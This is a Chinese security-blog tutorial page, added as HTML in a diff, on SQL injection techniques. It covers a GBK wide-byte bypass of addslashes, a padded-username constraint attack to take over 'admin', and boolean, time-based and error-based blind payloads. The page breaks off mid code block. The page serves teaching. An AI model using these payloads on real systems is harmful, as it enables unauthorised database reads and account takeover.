@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="YYK">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="YYK">
+    
+    <meta name="keywords" content="YYK,Cyber Security,网络安全">
+    
+    <meta name="description" content="">
+    <meta name="description" content="SQL注入两大类： 字符型注入例如：http:&#x2F;&#x2F;XXX.com&#x2F;sql&#x2F;id&#x3D;ok ,这里页面显示’ok’时，即为字符型型注入 数字型注入：例如：http:&#x2F;&#x2F;XXX.com&#x2F;sql&#x2F;id&#x3D;1 , 这里的id不需要闭合引号简单来说，在于有无引号的区别，字符型可以是字符和数字，但是数字型只能是数字宽字节注入宽字节注入是一个针对GBK的注入以下是addslashes()函数，此函数为常见防SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入（二）">
+<meta property="og:url" content="http://y-y-k.tk/2020/03/15/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/">
+<meta property="og:site_name" content="YYK&#39;s blog">
+<meta property="og:description" content="SQL注入两大类： 字符型注入例如：http:&#x2F;&#x2F;XXX.com&#x2F;sql&#x2F;id&#x3D;ok ,这里页面显示’ok’时，即为字符型型注入 数字型注入：例如：http:&#x2F;&#x2F;XXX.com&#x2F;sql&#x2F;id&#x3D;1 , 这里的id不需要闭合引号简单来说，在于有无引号的区别，字符型可以是字符和数字，但是数字型只能是数字宽字节注入宽字节注入是一个针对GBK的注入以下是addslashes()函数，此函数为常见防SQL注入">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190618181638930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191011222610227.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191011222753982.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191011230726771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191011231237260.png">
+<meta property="article:published_time" content="2020-03-15T03:01:26.533Z">
+<meta property="article:modified_time" content="2020-03-15T03:05:03.415Z">
+<meta property="article:author" content="YYK">
+<meta property="article:tag" content="web漏洞总结">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190618181638930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="YYK&#39;s Blog" type="application/atom+xml">
+    
+    <title>SQL注入（二） · YYK&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/logo_favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >YYK&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">SQL注入（二）</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>YYK's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            SQL注入（二）
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web漏洞总结">web漏洞总结</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.2k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/15</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="SQL注入两大类："><a href="#SQL注入两大类：" class="headerlink" title="SQL注入两大类："></a>SQL注入两大类：</h1><ol>
+<li>字符型注入<br>例如：<a href="http://XXX.com/sql/id=ok" target="_blank" rel="noopener">http://XXX.com/sql/id=ok</a> ,这里页面显示’ok’时，即为字符型型注入</li>
+<li>数字型注入：<br>例如：<a href="http://XXX.com/sql/id=1" target="_blank" rel="noopener">http://XXX.com/sql/id=1</a> , 这里的id不需要闭合引号<br>简单来说，在于有无引号的区别，字符型可以是字符和数字，但是数字型只能是数字<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2>宽字节注入是一个针对GBK的注入<br>以下是addslashes()函数，此函数为常见防SQL注入的函数<br><img src="https://img-blog.csdnimg.cn/20190618181638930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那么绕过的方法有两种：</li>
+<li>例如我们需要 ‘ 进行报错，那么我们前面再次加上\，得出\‘，使其转义,’生效</li>
+<li>&#39;的url编码为%5c%27，如果我们加上%df，得出%df%5c%27，变成運’，在这里需注意的是，我们用到的是gbk格式的url编码，这里因为MySQL使用gbk进行编码的，所以可以达到目的。</li>
+</ol>
+<h2 id="基于约束的SQL攻击"><a href="#基于约束的SQL攻击" class="headerlink" title="基于约束的SQL攻击"></a>基于约束的SQL攻击</h2><p>适用于以下场景：<br>对于用户名数据库进行了位数约束，比如限制只能为20位，管理员的用户名为admin，我们不知道密码，那么我们就可以通过写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin                                                   x,密码：123456</span><br></pre></td></tr></table></figure>
+<p>这时数据库会将其认为是admin，那么我们就可以通过123456进行登陆。数据库的代码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into user values(&#39;&#39;,&#39;admin                                                  x&#39;,&#39;123456&#39;)</span><br></pre></td></tr></table></figure>
+<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><h3 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h3><h4 id="1-left-database-1-gt-‘s’"><a href="#1-left-database-1-gt-‘s’" class="headerlink" title="1. left(database(),1) &gt; ‘s’"></a>1. left(database(),1) &gt; ‘s’</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left()指得到字符串从左算起指定个数的字符</span><br><span class="line">示例：left(string, n)</span><br><span class="line"></span><br><span class="line">left(database(),1) &gt; &#39;s&#39; 表示数据库名第一位是否大于&#39;s&#39;</span><br><span class="line">left(database(),2) &gt; &#39;ab&#39; 表示数据库名前两位是否大于&#39;ab&#39;</span><br></pre></td></tr></table></figure>
+<h4 id="2-substr-select-database-1-1-‘a’"><a href="#2-substr-select-database-1-1-‘a’" class="headerlink" title="2. substr((select database()),1,1) = ‘a’"></a>2. substr((select database()),1,1) = ‘a’</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">substr()和substring()实现功能均为截取字符串</span><br><span class="line">示例：substr(string, start, length)</span><br><span class="line">     substring(string, start, length)</span><br><span class="line">	 第一个参数为要处理的字符串，第二个为开始位置，第三个为截取长度</span><br><span class="line"></span><br><span class="line">substr((select database()),1,1) &#x3D; &#39;a&#39; 表示查看数据库名第一位是否等于&#39;a&#39;</span><br><span class="line">substr((select database()),2,1) &#x3D; &#39;a&#39; 表示查看数据库名第二位是否等于&#39;a&#39;</span><br></pre></td></tr></table></figure>
+<h4 id="3-ascii-ord-mid-函数"><a href="#3-ascii-ord-mid-函数" class="headerlink" title="3. ascii(), ord(), mid()函数"></a>3. ascii(), ord(), mid()函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ascii()：将字符变为ascii码</span><br><span class="line">ord()：同ascii()</span><br><span class="line"></span><br><span class="line">mid()：截取字符串**一部分**</span><br><span class="line">示例：mid(string, start, length)</span><br><span class="line">	 eg:string &#x3D; &quot;123456&quot;   mid(str, 2, 1)      结果为2</span><br><span class="line"></span><br><span class="line">ascii(substr((select database()),1,1)) &#x3D; 108</span><br><span class="line">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1)) &gt;98 --+</span><br></pre></td></tr></table></figure>
+<h4 id="4-regexp正则注入，like匹配注入"><a href="#4-regexp正则注入，like匹配注入" class="headerlink" title="4. regexp正则注入，like匹配注入"></a>4. regexp正则注入，like匹配注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先注意的是，此方法不能用做mssql。但是mysql同时支持like和regexp匹配，不过方法不同。</span><br><span class="line"></span><br><span class="line">eg：select user() regexp &#39;^ro&#39;</span><br><span class="line">    select user() like &#39;ro%&#39;</span><br></pre></td></tr></table></figure>
+<p>具体可查看<a href="https://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">关于正则表达式详细讲解</a>。</p>
+<h3 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h3><h4 id="1-If-ascii-substr-database-1-1-gt-115-0-sleep-5"><a href="#1-If-ascii-substr-database-1-1-gt-115-0-sleep-5" class="headerlink" title="1. If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))"></a>1. If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if()：判断然后返回值</span><br><span class="line"></span><br><span class="line">示例：IF(condition, value_if_true, value_if_false)</span><br><span class="line">     Less-5&#x2F;?id&#x3D;1&#39; and If(ascii(substr(database(),1,1))&gt;115,0,sleep(10)) --+</span><br></pre></td></tr></table></figure>
+<h4 id="2-select-sleep-find-in-set-mid-user-1-1-‘a-w-t-r’-（-user-为root-localhost-）"><a href="#2-select-sleep-find-in-set-mid-user-1-1-‘a-w-t-r’-（-user-为root-localhost-）" class="headerlink" title="2. select sleep(find_in_set(mid(user(), 1, 1), ‘a,w,t,r’));    （ user()为root@localhost ）"></a>2. select sleep(find_in_set(mid(user(), 1, 1), ‘a,w,t,r’));    （ user()为root@localhost ）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find_in_set()：查询str是否在strlist里</span><br><span class="line"></span><br><span class="line">示例：FIND_IN_SET(str,strlist)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT FIND_IN_SET(&#39;b&#39;, &#39;a,b,c,d&#39;);</span><br><span class="line">-&gt; 2                   因为b 在strlist集合中放在2的位置 从1开始</span><br></pre></td></tr></table></figure>
+
+<p>下图是可被查询到的结果，我们可以看到sleep了一段时间，经测试发现，睡眠时间每次不定，不利于用作真实渗透测试<br><img src="https://img-blog.csdnimg.cn/20191011222610227.png" alt="可查询到"><br>下图是未被查询到的结果，我们可以看到没有sleep<br><img src="https://img-blog.csdnimg.cn/20191011222753982.png" alt="未查询到"></p>
+<h4 id="3-UNION-SELECT-IF-SUBSTRING-current-1-1-CHAR-119-BENCHMARK-5000000-ENCODE-‘M"><a href="#3-UNION-SELECT-IF-SUBSTRING-current-1-1-CHAR-119-BENCHMARK-5000000-ENCODE-‘M" class="headerlink" title="3. UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M"></a>3. UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M</h4><p>SG’,’by 5 seconds’)),null) FROM (select database() as t1;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">上面有说到benchmark()函数和encode()函数，下面我们仔细说下</span><br><span class="line"></span><br><span class="line">endoce()：使用key对text进行加密</span><br><span class="line">示例：ENCODE(&#39;text&#39;,&#39;key&#39;);</span><br><span class="line"></span><br><span class="line">BENCHMARK()：可控制次数的执行函数</span><br><span class="line">示例：benchmark(count,expr)            count为次数，expr为要执行的表达</span><br><span class="line">式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执</span><br><span class="line">行成功。这是一种边信道攻击，可在运行过程中占用大量的 cpu 资源。</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(  <span class="keyword">SUBSTRING</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">CHAR</span>(<span class="number">119</span>),    <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">ENCODE</span>(‘MSG’,’<span class="keyword">by</span> <span class="number">5</span> <span class="keyword">seconds</span>’))     ,  <span class="literal">null</span>) <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> t1;</span><br><span class="line">将其分开可看到此语句是通过先判断当前数据库名第一位是否为猜测值，如果是，则执行benchmark()函数，否为返回null</span><br></pre></td></tr></table></figure>
+<p>下图是执行次数大小效果的对比</p>
+<p><img src="https://img-blog.csdnimg.cn/20191011230726771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="执行效果"><br>因为不是很建议用上面那个函数，下面列出几种函数（取自《白帽子讲安全》）<br><img src="https://img-blog.csdnimg.cn/20191011231237260.png" alt="在这里插入图片描述"></p>
+<h3 id="报错盲注："><a href="#报错盲注：" class="headerlink" title="报错盲注："></a>报错盲注：</h3><p>程序将错误信息输出到了页面上，其格式有多种，大体如下（重点讲解Duplicate entry报错，Xpath报错，整形溢出报错）</p>
+<h4 id="1-Duplicate-entry报错："><a href="#1-Duplicate-entry报错：" class="headerlink" title="1.Duplicate entry报错："></a>1.Duplicate entry报错：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br><span class="line"><span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>原理是查询时会建立临时表存储数据，不存在键值就插入，group by使插入前rand()会再执行一次，存在就直接值加1。以上用到几种函数：count(), concat(), floor()，rand()，简单说下：</p>
+<ol>
+<li><p>count() 函数返回与指定条件匹配的行数。<br>eg：SELECT COUNT(column_name) FROM table_name WHERE condition;</p>
+</li>
+<li><p>concat() 函数将两个或多个表达式加在一起。<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#39;11&#39;,&#39;22&#39;,&#39;33&#39;);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(&#39;11&#39;,&#39;22&#39;,&#39;33&#39;) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 112233 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#39;11&#39;,&#39;22&#39;,null);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(&#39;11&#39;,&#39;22&#39;,null) |</span><br><span class="line">+------------------------+</span><br><span class="line">| NULL   |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><p>floor() 函数返回小于或等于数字的最大整数值。并向下取整排列。<br>eg：SELECT FLOOR(25.75) AS FloorValue;      结果：25</p>
+</li>
+<li><p>rand() 函数返回 [0,1) 的随机数。<br>eg：SELECT RAND();             结果：0.455611560918029等<br>查询第一条记录，rand(0)得键值0不存在临时表，执行插入，此时rand(0)再执行，得1，于是插入了1。<br>查询第二条记录，rand(0)得1，键值1存在临时表，则值加1得2。<br>查询第三条记录，rand(0)得0，键值0不存在临时表，执行插入，rand(0)再次执行，得键值1，1存在于临时表，由于键值必须唯一，导致报错。<br>例如通过floor报错,注入语句如下:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">最上面那个sql语句可以简化成这个</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">user</span>(),</span><br><span class="line"><span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</span><br><span 